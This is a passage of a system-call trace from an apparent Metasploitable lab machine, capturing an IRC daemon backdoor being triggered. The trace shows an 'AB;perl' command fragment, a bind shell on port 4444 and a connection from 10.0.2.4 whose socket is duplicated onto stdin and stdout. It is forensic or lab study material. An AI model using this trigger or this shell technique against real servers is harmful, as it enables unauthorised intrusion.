Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
6693  07:15:05.042945 close(6)          = 0
6693  07:15:05.042956 munmap(0xb7de7000, 4096) = 0
6693  07:15:05.042974 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
6693  07:15:05.042988 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
6693  07:15:05.043005 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7de7000
6693  07:15:05.049799 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
6693  07:15:05.049944 close(6)          = 0
6693  07:15:05.049955 munmap(0xb7de7000, 4096) = 0
6693  07:15:05.049989 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
6693  07:15:05.050013 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe79818) = -1 EINVAL (Invalid argument)
6693  07:15:05.050028 _llseek(6, 0, 0xbfe79860, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6693  07:15:05.050069 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe79818) = -1 EINVAL (Invalid argument)
6693  07:15:05.050083 _llseek(6, 0, 0xbfe79860, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6693  07:15:05.050107 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
6693  07:15:05.050168 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
6693  07:15:05.050206 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
6693  07:15:05.050236 listen(6, 5)      = 0
6693  07:15:05.050295 accept(6,  <unfinished ...>
6692  07:15:05.050581 exit_group(0)     = ?
6690  07:15:05.050684 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 6692
6690  07:15:05.050703 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6690  07:15:05.050717 --- SIGCHLD (Child exited) @ 0 (0) ---
6690  07:15:05.050726 waitpid(-1, 0xbfcb9828, WNOHANG) = -1 ECHILD (No child processes)
6690  07:15:05.050737 sigreturn()       = ? (mask now [])
6690  07:15:05.050753 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
6690  07:15:05.050798 exit_group(0)     = ?
4519  07:15:05.050833 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 6690
4519  07:15:05.050845 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:15:05.050860 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:15:05.050871 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:15:05.050881 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:15:05.050899 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:15:05.050984 time(NULL)        = 1495624505
4519  07:15:05.051024 time(NULL)        = 1495624505
4519  07:15:05.051044 gettimeofday({1495624505, 51048}, NULL) = 0
4519  07:15:05.051058 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:15:05.051090 clock_gettime(CLOCK_MONOTONIC, {1314, 868103476}) = 0
4519  07:15:05.051103 gettimeofday({1495624505, 51107}, NULL) = 0
4519  07:15:05.051115 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 990000})
4519  07:15:05.059652 clock_gettime(CLOCK_MONOTONIC, {1314, 876670746}) = 0
4519  07:15:05.059671 recv(7, "PRIVMSG  #testit2 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  07:15:05.059698 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059747 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059764 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059796 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059809 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059824 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059837 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059851 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059865 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059878 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059893 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059907 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059920 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059934 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059947 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059961 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059975 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.059988 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.060002 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.060017 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.060031 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.060045 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.060065 gettimeofday({1495624505, 60070}, NULL) = 0
4519  07:15:05.060078 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
6693  07:15:05.506686 <... accept resumed> {sa_family=AF_INET, sin_port=htons(46143), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
6693  07:15:05.506739 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78808) = -1 EINVAL (Invalid argument)
6693  07:15:05.506755 _llseek(8, 0, 0xbfe78850, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6693  07:15:05.506768 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78808) = -1 EINVAL (Invalid argument)
6693  07:15:05.506779 _llseek(8, 0, 0xbfe78850, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6693  07:15:05.506790 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
6693  07:15:05.506835 close(6)          = 0
6693  07:15:05.506905 dup(8)            = 6
6693  07:15:05.506919 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe796a8) = -1 EINVAL (Invalid argument)
6693  07:15:05.506930 _llseek(6, 0, 0xbfe796f0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6693  07:15:05.506941 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
6693  07:15:05.506960 dup2(6, 1)        = 1
6693  07:15:05.506972 close(6)          = 0
6693  07:15:05.507020 fcntl64(1, F_SETFD, 0) = 0
6693  07:15:05.507032 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe79678) = -1 EINVAL (Invalid argument)
6693  07:15:05.507044 _llseek(1, 0, 0xbfe796c0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6693  07:15:05.507090 dup(8)            = 6
6693  07:15:05.507102 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe796a8) = -1 EINVAL (Invalid argument)
6693  07:15:05.507113 _llseek(6, 0, 0xbfe796f0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6693  07:15:05.507123 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
6693  07:15:05.507140 dup2(6, 0)        = 0
6693  07:15:05.507150 close(6)          = 0
6693  07:15:05.507160 fcntl64(0, F_SETFD, 0) = 0
6693  07:15:05.507173 fcntl64(0, F_SETFD, 0) = 0
6693  07:15:05.507189 read(0,  <unfinished ...>
4519  07:15:05.507469 <... select resumed> ) = 1 (in [5], left {0, 560000})
4519  07:15:05.507527 clock_gettime(CLOCK_MONOTONIC, {1315, 324555889}) = 0
4519  07:15:05.507558 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:15:05.507572 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:15:05.507593 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:15:05.507610 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:15:05.507658 close(5)          = 0
4519  07:15:05.507672 time(NULL)        = 1495624505
4519  07:15:05.507682 time(NULL)        = 1495624505
4519  07:15:05.507694 gettimeofday({1495624505, 507697}, NULL) = 0
4519  07:15:05.507705 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:15:05.507735 clock_gettime(CLOCK_MONOTONIC, {1315, 324747909}) = 0
4519  07:15:05.507745 gettimeofday({1495624505, 507749}, NULL) = 0
4519  07:15:05.507756 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 930000})
4519  07:15:05.570197 clock_gettime(CLOCK_MONOTONIC, {1315, 387249348}) = 0
4519  07:15:05.570296 recv(7, "PRIVMSG  #testit2 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  07:15:05.570353 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570389 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570415 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570437 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570451 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570465 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570479 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570492 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570506 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570520 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570533 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570547 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570568 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570582 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570596 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570609 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570623 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570637 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570651 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570680 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570722 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570736 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 160000}, ...}) = 0
4519  07:15:05.570768 gettimeofday({1495624505, 570772}, NULL) = 0
4519  07:15:05.570780 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
